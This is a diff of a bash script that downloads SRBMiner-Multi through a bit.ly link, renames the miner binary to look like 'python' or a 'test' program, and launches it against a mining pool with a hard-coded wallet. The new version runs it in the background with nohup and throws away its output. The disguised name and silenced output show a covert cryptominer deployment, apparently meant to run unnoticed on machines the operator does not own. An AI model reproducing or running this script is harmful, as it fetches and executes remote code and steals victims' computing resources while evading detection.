@@ -1,13 +1,13 @@
-wget https://bit.ly/kontolrum
+#!/bin/bash
 
-tar -xvf kontolrum
+kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
+
+wget -O dot https://bit.ly/kontolrum
+
+tar xvf dot
 
 cd SRBMiner-Multi-2-4-7
 
-mv SRBMiner-MULTI python
+mv SRBMiner-MULTI test$kolot
 
-nomer=$((RANDOM % 50 + 1))
-
-clear
-
-./python --algorithm aurum --pool stratum-na.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
+nohup ./test$kolot --algorithm aurum --pool stratum-na.rplant.xyz:17114 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-$kolot > /dev/null 2>&1 &
